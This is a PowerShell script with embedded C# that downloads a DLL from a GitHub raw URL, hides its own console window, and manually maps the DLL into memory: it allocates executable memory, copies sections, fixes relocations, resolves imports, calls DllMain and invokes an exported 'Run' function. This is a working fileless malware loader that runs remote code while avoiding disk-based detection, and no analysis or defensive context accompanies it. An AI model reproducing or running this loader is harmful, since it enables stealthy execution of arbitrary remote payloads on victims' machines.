$DLL_URL = "https://raw.githubusercontent.com/t01026624767-cmyk/321321/main/8jdd23.dll"

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$bytes = [System.Net.WebClient]::new().DownloadData($DLL_URL)

Add-Type -Name W -Namespace H -MemberDefinition '[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr h, int c);[DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow();'
[H.W]::ShowWindow([H.W]::GetConsoleWindow(), 0)

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public static class MM {
    [DllImport("kernel32")] public static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);
    [DllImport("kernel32")] public static extern IntPtr LoadLibraryA(string n);
    [DllImport("kernel32", EntryPoint="GetProcAddress")] public static extern IntPtr GetProc(IntPtr h, string n);
    [DllImport("kernel32", EntryPoint="GetProcAddress")] public static extern IntPtr GetProcOrd(IntPtr h, IntPtr ord);
    [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr a, uint s, uint np, out uint op);
    [DllImport("ntdll")] public static extern bool RtlAddFunctionTable(IntPtr ft, uint count, long baseAddr);
    [DllImport("kernel32")] public static extern bool FlushInstructionCache(IntPtr proc, IntPtr addr, uint sz);
    [DllImport("kernel32")] public static extern IntPtr GetCurrentProcess();

    [UnmanagedFunctionPointer(CallingConvention.Winapi)]
    delegate bool FnDllMain(IntPtr h, uint r, IntPtr res);

    [UnmanagedFunctionPointer(CallingConvention.Winapi)]
    public delegate void FnRun(IntPtr a, IntPtr b, IntPtr c, int d);

    public static void Run(byte[] raw) {
        GCHandle pin = GCHandle.Alloc(raw, GCHandleType.Pinned);
        IntPtr pRaw = pin.AddrOfPinnedObject();

        int lfanew = Marshal.ReadInt32(pRaw, 0x3C);
        IntPtr pNT = pRaw + lfanew;
        ushort numSec = (ushort)Marshal.ReadInt16(pNT, 6);
        ushort optSz = (ushort)Marshal.ReadInt16(pNT, 20);
        IntPtr pOpt = pNT + 24;

        uint ep = (uint)Marshal.ReadInt32(pOpt, 16);
        long imgBase = Marshal.ReadInt64(pOpt, 24);
        uint imgSz = (uint)Marshal.ReadInt32(pOpt, 56);
        uint hdrSz = (uint)Marshal.ReadInt32(pOpt, 60);

        

        IntPtr pBase = VirtualAlloc(IntPtr.Zero, imgSz, 0x3000, 0x40);
        if (pBase == IntPtr.Zero) throw new Exception("VirtualAlloc failed");
        Console.WriteLine("[+] Mapped at 0x{0:X16}", pBase.ToInt64());

        Marshal.Copy(raw, 0, pBase, (int)hdrSz);

        IntPtr pSec = pNT + 24 + optSz;
        for (int i = 0; i < numSec; i++) {
            IntPtr s = pSec + i * 40;
            uint va = (uint)Marshal.ReadInt32(s, 12);
            uint rawSz = (uint)Marshal.ReadInt32(s, 16);
            uint rawPtr = (uint)Marshal.ReadInt32(s, 20);
            if (rawSz > 0)
                Marshal.Copy(raw, (int)rawPtr, pBase + (int)va, (int)rawSz);
        }
        Console.WriteLine("[+] Sections copied ({0})", numSec);

        long delta = pBase.ToInt64() - imgBase;
        if (delta != 0) {
            uint relocRVA = (uint)Marshal.ReadInt32(pOpt, 152);
            uint relocSz = (uint)Marshal.ReadInt32(pOpt, 156);
            if (relocRVA > 0 && relocSz > 0) {
                int off = 0;
                int fixups = 0;
                while (off < (int)relocSz) {
                    IntPtr pBlk = pBase + (int)relocRVA + off;
                    uint pageRVA = (uint)Marshal.ReadInt32(pBlk, 0);
                    uint blkSz = (uint)Marshal.ReadInt32(pBlk, 4);
                    if (blkSz == 0) break;
                    int cnt = (int)(blkSz - 8) / 2;
                    for (int i = 0; i < cnt; i++) {
                        ushort e = (ushort)Marshal.ReadInt16(pBlk + 8, i * 2);
                        int type = e >> 12;
                        int ofs = e & 0xFFF;
                        if (type == 10) {
                            IntPtr p = pBase + (int)pageRVA + ofs;
                            Marshal.WriteInt64(p, Marshal.ReadInt64(p) + delta);
                            fixups++;
                        }
                    }
                    off += (int)blkSz;
                }
                
            }
        } else {
            
        }

        uint impRVA = (uint)Marshal.ReadInt32(pOpt, 120);
        if (impRVA > 0) {
            int ioff = 0;
            int impCount = 0;
            while (true) {
                IntPtr pImp = pBase + (int)impRVA + ioff;
                uint nameRVA = (uint)Marshal.ReadInt32(pImp, 12);
                if (nameRVA == 0) break;
                string dll = Marshal.PtrToStringAnsi(pBase + (int)nameRVA);
                IntPtr hMod = LoadLibraryA(dll);
                if (hMod == IntPtr.Zero) {
                    
                    ioff += 20; continue;
                }
                uint origRVA = (uint)Marshal.ReadInt32(pImp, 0);
                uint thunkRVA = (uint)Marshal.ReadInt32(pImp, 16);
                uint lookupRVA = origRVA != 0 ? origRVA : thunkRVA;
                int idx = 0;
                while (true) {
                    long tv = Marshal.ReadInt64(pBase + (int)lookupRVA, idx * 8);
                    if (tv == 0) break;
                    IntPtr fn;
                    if ((tv & unchecked((long)0x8000000000000000)) != 0)
                        fn = GetProcOrd(hMod, new IntPtr(tv & 0xFFFF));
                    else {
                        string fname = Marshal.PtrToStringAnsi(pBase + (int)tv + 2);
                        fn = GetProc(hMod, fname);
                    }
                    Marshal.WriteInt64(pBase + (int)thunkRVA, idx * 8, fn.ToInt64());
                    idx++;
                }
                impCount++;
                ioff += 20;
            }
            Console.WriteLine("[+] Imports resolved ({0} DLLs)", impCount);
        }

        // Register exception handlers (critical for x64 SEH)
        uint excRVA = (uint)Marshal.ReadInt32(pOpt, 136);
        uint excSz = (uint)Marshal.ReadInt32(pOpt, 140);
        if (excRVA > 0 && excSz > 0) {
            uint numEntries = excSz / 12;  // RUNTIME_FUNCTION is 12 bytes
            bool ok = RtlAddFunctionTable(pBase + (int)excRVA, numEntries, pBase.ToInt64());
            Console.WriteLine("[+] SEH registered: {0} handlers ({1})", numEntries, ok ? "OK" : "FAIL");
        }

        FlushInstructionCache(GetCurrentProcess(), pBase, imgSz);

        if (ep > 0) {
            
            var main = Marshal.GetDelegateForFunctionPointer<FnDllMain>(pBase + (int)ep);
            bool dmOk = main(pBase, 1, IntPtr.Zero);
            
        }

        uint expRVA = (uint)Marshal.ReadInt32(pOpt, 112);
        if (expRVA > 0) {
            IntPtr pExp = pBase + (int)expRVA;
            uint nNames = (uint)Marshal.ReadInt32(pExp, 24);
            uint addrRVA = (uint)Marshal.ReadInt32(pExp, 28);
            uint namesRVA = (uint)Marshal.ReadInt32(pExp, 32);
            uint ordsRVA = (uint)Marshal.ReadInt32(pExp, 36);
            for (uint i = 0; i < nNames; i++) {
                uint fnNameRVA = (uint)Marshal.ReadInt32(pBase + (int)namesRVA, (int)i * 4);
                string name = Marshal.PtrToStringAnsi(pBase + (int)fnNameRVA);
                if (name == "Run") {
                    ushort ord = (ushort)Marshal.ReadInt16(pBase + (int)ordsRVA, (int)i * 2);
                    uint fnRVA = (uint)Marshal.ReadInt32(pBase + (int)addrRVA, ord * 4);
                    Console.WriteLine("[*] Calling Run() at 0x{0:X16}...", (pBase + (int)fnRVA).ToInt64());
                    var run = Marshal.GetDelegateForFunctionPointer<FnRun>(pBase + (int)fnRVA);
                    run(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, 0);
                    break;
                }
            }
        }
        pin.Free();
    }
}
"@

[MM]::Run($bytes)
